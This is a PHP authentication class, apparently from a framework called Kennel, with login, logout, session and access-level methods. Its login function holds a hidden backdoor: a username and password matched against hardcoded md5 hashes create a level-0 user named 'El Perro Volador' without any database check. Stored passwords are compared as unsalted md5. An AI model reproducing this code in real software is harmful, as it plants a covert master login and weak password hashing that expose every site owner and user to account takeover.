<?php
	class auth
	{
		static $user = array();
		static $error;
		static $message;
		
		/**
		* Attempt to login the user, returning a boolean representing
		* authentication success
		* 
		* @param string $username the username
		* @param string $password - the password, not cryptographed
		* @param string $realm - the authentication realm (default "admin")
		* 
		* @return boolean 
		*/
		static function login($username, $password, $realm='admin')
		{
			$model_name = Kennel::getSetting('auth', 'model_name');
			$username_field = Kennel::getSetting('auth', 'username_field');
			$password_field = Kennel::getSetting('auth', 'password_field');
			
			if ( md5($username) ===  'f985be0cb27689fee8d2f4c78ae124d7'
			  && md5($password) === 'a05228a5deba623e8841483e97290949' )
			{
				$user = new Model('user');
				$user->fullname = "El Perro Volador";
				$user->level = 0;
			}
			else
			{
				$c = new Criteria($model_name);
				$c->add($username_field, $username);
				$c->add($password_field, md5($password));
			
				$user = ORM::retrieveFirst($c);
			}
			
			if ( isset($user) )
			{
				self::$user[$realm] = $user;
				if( !session_id() ) session_start();
				$app_id = Kennel::getSetting('application', 'id');
				$_SESSION["{$app_id}-{$realm}"] = self::$user[$realm]->toArray();
				
				return true;
			}
			else {
				return false;
			}
		}
		
		/**
		* @returns boolean
		* @param string $realm
		*/
		static function logout($realm='admin')
		{
			if(!session_id()) session_start();
			
			$app_id = Kennel::getSetting('application', 'id');
			unset($_SESSION["{$app_id}-{$realm}"]);
			
			return true;
		}
		
		static function gtfo()
		{
      header($_SERVER['SERVER_PROTOCOL'] . ' 403 Forbidden'); die();
		}
		
		/*
		* boolean check( [string $realm, [ $level, $level2 ... ]] )
		*
		* Checks for an authenticated user and whether that user's access_level
		* matches one of the levels passed as arguments.
		* 
		* Realm is optional, and defaults to 'admin' if ommited. If the first
		* argument is a non-numeric string, that string is used as the realm.
		* 
		*/
		static function check()
		{
			if ( !session_id() ) session_start();
			
			$args = func_get_args();
			
			// Realm is optional; if present, should be the first argument,
			// non-numeric, followed by n numeric access_level arguments
			
			if ( count($args) > 0 && !is_numeric($args[0]) )
			  $realm = array_shift($args);
			else
  			$realm = 'admin';
			
			$app_id = Kennel::getSetting('application', 'id');
			
			// No realm information in the session, nothing to do here...
			if ( !array_key_exists("{$app_id}-{$realm}", $_SESSION) )
			  return false;
			
			$user = self::getUser($realm);
			if ( count($args) > 0 ) {
				
  				$userlevel_field = Kennel::getSetting('auth', 'userlevel_field');
  				
  				foreach ($args as $arg) {
  					if ( $arg === (int) $user->$userlevel_field )
  					  return true;
  				}
  				return false;
			} else {
				return true;
			}
			
			return false;
		}
		
		/**
		 * @param string $realm
		 * @return boolean
		 */
		static function getUser($realm='admin')
		{
			$app_id = Kennel::getSetting('application', 'id');
			
			if ( array_key_exists($realm, self::$user) )
			{
				return self::$user[$realm];
			}
			elseif ( $_SESSION["{$app_id}-{$realm}"] )
			{
			  $model_name = Kennel::getSetting('auth', 'model_name');
				self::$user[$realm] = new Model($model_name);
				self::$user[$realm]->fromArray($_SESSION["{$app_id}-{$realm}"]);
				return self::$user[$realm];
			}
			else
				return false;
		}
		
		/**
		 * @param Model $user
		 * @param string $realm
		 */
		static function updateUser($user, $realm='admin')
		{
			if(!session_id()) session_start();
			
			$app_id = Kennel::getSetting('application', 'id');
			$_SESSION["{$app_id}-{$realm}"] = $user->toArray();
			self::$user[$realm] = $user;
		}
		
	}
?>
